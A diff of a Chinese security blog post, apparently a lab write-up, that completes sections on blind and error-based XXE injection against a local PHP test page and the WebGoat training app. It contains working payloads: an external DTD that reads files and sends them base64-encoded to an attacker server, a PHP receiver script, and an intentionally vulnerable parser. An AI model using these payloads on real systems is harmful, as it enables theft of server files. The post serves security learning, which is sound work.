@@ -195,7 +195,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.9k 字
+      2.2k 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      24
+      28
        分钟
     </span>
   
@@ -245,8 +245,8 @@
 <h3 id="xxe漏洞检测"><a href="#xxe漏洞检测" class="headerlink" title="xxe漏洞检测"></a>xxe漏洞检测</h3><p>找到一个可以上传东西的地方，通常在我们上传数据后，我们并不知道服务器会不会把我们的数据当作xml格式解析，如果当作xml格式解析的话又有没有禁用外部实体引用。因此，我们采用如下payload来检测：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY test SYSTEM &#x27;http://yourserverip/&#x27;&gt;]&gt;<br>&lt;root&gt;&amp;test;&lt;/root&gt;<br></code></pre></div></td></tr></table></figure>
 
-<p>这里定义了一个外部实体，让服务器将其解析为我们的服务器IP地址。</p>
-<p>这样的话如果我们服务器的网络日志文件中有一个新的连接，那么就可以确认服务器解析了xml的外部实体，此处存在xxe漏洞。</p>
+<p>这里定义了一个外部实体，xml解析器解析时会向我们的服务器IP发起一次请求。</p>
+<p>这样的话如果payload生效，我们服务器的网络日志文件中有一个新的连接，那么就可以确认服务器解析了xml的外部实体，此处存在xxe漏洞。</p>
 <hr>
 <h3 id="实验环节"><a href="#实验环节" class="headerlink" title="实验环节"></a>实验环节</h3><h4 id="有回显的xxe注入"><a href="#有回显的xxe注入" class="headerlink" title="有回显的xxe注入"></a>有回显的xxe注入</h4><p>在这种情况下，外部实体包含在本地DTD中，这也是我上一篇博客中的实验形式</p>
 <h5 id="读取普通文件"><a href="#读取普通文件" class="headerlink" title="读取普通文件"></a>读取普通文件</h5><p>本地php:</p>
@@ -293,25 +293,36 @@
 <p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405155417.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
-<h3 id="以下内容施工中，实验一直没能成功，先咕咕一阵子"><a href="#以下内容施工中，实验一直没能成功，先咕咕一阵子" class="headerlink" title="!!以下内容施工中，实验一直没能成功，先咕咕一阵子"></a>!!以下内容施工中，实验一直没能成功，先咕咕一阵子</h3><h4 id="xxe盲注"><a href="#xxe盲注" class="headerlink" title="xxe盲注"></a>xxe盲注</h4><p>在实际情况中，服务器接收的xml数据是不会输出的，就是说php语句中不会<code>echo $xml;</code>服务器端a.php:</p>
+<h4 id="无回显xxe注入"><a href="#无回显xxe注入" class="headerlink" title="无回显xxe注入"></a>无回显xxe注入</h4><h5 id="xxe盲注"><a href="#xxe盲注" class="headerlink" title="xxe盲注"></a>xxe盲注</h5><p>在实际情况中，服务器接收的xml数据是不会输出的，就是说php语句中不会<code>echo $xml;</code>服务器端a.php:</p>
 <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    libxml_disable_entity_loader (<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
 
 <p>因此我们想要现实中利用这个漏洞就需要找到一种回显的方法。</p>
 <p>我们上传的payload仍然只是一个XML格式的文档。但因为没有回显，所以我们上传的XML要完成两个任务，一个是读取目标文件内容，一个将读取到的文件发给我们攻击者的机器。根据DTD外部实体的作用<strong>引用指定url/uri</strong>，所以理论上通过外部实体是可以达成攻击的。</p>
+<p><em>(实际环境下127.0.0.1换成攻击者的公网ip)</em></p>
 <p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY % test SYSTEM &#x27;http://yourserver/xml.dtd&#x27;&gt; %test; %exe;]&gt;<br>&lt;root&gt;&amp;entity;&lt;/root&gt;<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!DOCTYPE convert [ <br>&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/a.dtd&quot;&gt;<br>%remote;%int;%send;<br>]&gt;<br></code></pre></div></td></tr></table></figure>
 
 <p>xml.dtd:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;<br>&lt;!ENTIY % exe &quot;&lt;!ENTITY entity SYSTEM &#x27;http://yourserver/%file;&#x27;&gt;&quot;&gt;	<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///E:/x.txt&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1/recive.php?a=%file;&#x27;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure>
 
+<p><strong>注意</strong>，一般情况下只能用file协议指定路径，如</p>
+<p><code>file SYSTEM file:///E:/x.txt</code></p>
+<p>如果接收xml数据的代码为<code>file_get_contents(&#39;php://input&#39;)</code>时才可以加php伪协议，如</p>
+<p><code>file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///E:/x.txt</code></p>
+<p>参数实体内的%不会生效，所以用&amp;#37代替（&amp;#37的url解码为%）</p>
+<p>在攻击者服务器上，有着一个接收数据的php文件</p>
+<p>recive.php</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>	<span class="hljs-keyword">echo</span><span class="hljs-string">&quot;<span class="hljs-subst">$a</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p><em>我看的大佬们都是用的端口监听，我试下就在windows环境中复现（绝对不是因为我弄不来监听服务😕）</em></p>
 <p>payload作用过程：</p>
 <ul>
-<li><p>payload中定义了参数实体<code>% test</code>，并调用该实体<code>%test;</code>，使得xml解析器解析时引用攻击者Web服务器上的dtd文件，接着调用参数实体<code>%exe;</code>和通用实体<code>&amp;entity;</code>。</p>
+<li><p>payload中定义了参数实体<code>% remote</code>，并调用该实体<code>%remote;</code>，使得xml解析器解析时引用攻击者Web服务器上的dtd文件，接着调用参数实体<code>%int;</code>和<code>%send;</code>。</p>
 </li>
-<li><p>在被引用的dtd文件中，有着payload所调用的参数实体的定义，即<code>% exe</code>。然后<code>%exe；</code>被解析的时候又生成了另一个通用实体的定义，即<code>ENTITY</code>，同样在payload中以<code>&amp;entity</code>的形式被调用。</p>
-<p><em>这一步构造参数实体<code>% exe</code>来引入通用实体<code>entity</code>是必须的（此处也可以引入另一个参数实体），这是根据xml文档解析规则来写的</em></p>
+<li><p>在被引用的dtd文件中，有着payload所调用的参数实体的定义，即<code>% int</code>。然后<code>%int；</code>被解析的时候又生成了另一个参数实体的定义，即<code>% send</code>，同样在payload中以<code>%send</code>的形式被调用。</p>
+<p><em>这一步构造参数实体<code>% int</code>来引入另一个实体<code>send</code>是必须的（此处也可以引入另一个参数实体,，需要更改payload和dtd结构），这是根据xml文档解析规则来写的</em></p>
 </li>
-<li><p>当xml解析器解析通用实体<code>&amp;entity</code>时，该实体将参数实体<code>% file</code>获取到的编码后的文件内容发送给攻击者。</p>
+<li><p>当xml解析器解析通用实体<code>%send</code>时，该实体将参数实体<code>% file</code>获取到的编码后的文件内容发送给攻击者。</p>
 </li>
 </ul>
 <p>从逻辑上来说，我们没必要从攻击者的服务器上调用dtd文件，直接在payload中写好读取文件和发送文件就行了，就像这样：</p>
@@ -320,25 +331,40 @@
 <p>这样解析后的结果为<code>http://yourserver/%filecontents</code>，参数实体不会解析</p>
 <p>这是因为根据xml文档规定，参数实体不能在DTD子集内调用，但可以在外部子集中调用，即我们payload中的形式。</p>
 <p>实验步骤：</p>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>其实和盲注一样，只是最后发送信息时发送到一个不存在的地方即可</p>
-<p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY % test SYSTEM &#x27;http://127.0.0.1/a.dtd&#x27;&gt; %test; %exe;]&gt;<br>&lt;root&gt;&amp;entity;&lt;/root&gt;<br></code></pre></div></td></tr></table></figure>
-
-<p>127.0.0.1/a.dtd：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=E:/x.txt&quot;&gt;<br>&lt;!ENTIY % exe &quot;&lt;!ENTITY entity SYSTEM &#x27;http://xxx/c=%file;&#x27;&gt;&quot;&gt;	<br></code></pre></div></td></tr></table></figure>
-
+<p>注意一下要用到的三个文件，靶场a.php，引用的a.dtd，接收数据的recive.php：</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182244.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传xml数据，抓包，填上payload，发送</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182446.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们再来查看apache的log文件</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182558.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功接收到一个经过base64编码的请求，解码验证一下</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411182658.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功读取到目标主机上的文件</p>
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>其实和盲注一样，只是最后发送信息时发送到一个不存在的地方即可，我们还是先再来做一次盲注吧😉后面我会附上上报错注入的效果的</p>
+<p>这次我们试着在WebGoat靶场上实现</p>
 <p>以WebGoat A4 xxe部分为例，关卡告诉我们要读取的文件路径为<code>/home/webgoat/.webgoat-8.1.0//XXE/secret.txt</code></p>
-<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220409200913.png" srcset="/img/loading.gif" lazyload></p>
+<p>靶场告诉了我们需要读取文件的路径</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411183519.png" srcset="/img/loading.gif" lazyload></p>
 <p>在这个评论区处我们上传评论并抓包</p>
 <p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220409201013.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现数据以xml格式提交，先在攻击机上准备好被引用的dtd文件</p>
 <p>a.dtd：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/home/webgoat/.webgoat-8.1.0//XXE/secret.txt&quot;&gt;<br>&lt;!ENTIY % exe &quot;&lt;!ENTITY entity SYSTEM &#x27;http://xxx/c=%file;&#x27;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///home/webgoat/.webgoat-8.1.0//XXE/secret.txt&quot;&gt;<br>&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.189.1/recive.php?a=%file;&#x27;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure>
 
+<p><em>报错注入的话就是把dtd文件里发送的地址乱填</em></p>
 <p>设置payload并发送：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.189.1/a.dtd&quot;&gt;<br>%dtd;<br>%print;<br>%send;<br>]&gt;<br>&lt;comment&gt;  &lt;text&gt;aaa&lt;/text&gt;&lt;/comment&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411191258.png" srcset="/img/loading.gif" lazyload></p>
+<p>同样再查看一下log文件</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411191337.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功读取到目标数据</p>
+<p>而报错注入的话，会在返回页面的报错信息中获取到文件内容</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220411192604.png" srcset="/img/loading.gif" lazyload></p>
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://lalajun.github.io/2019/12/03/WEB-XXE/">WEB-XXE (lalajun.github.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/elephantxiang/article/details/114680896"> WebGoat (A4) XML External Entities (XXE)_仙女象的博客-CSDN博客</a></p>
 
             </div>
             <hr>
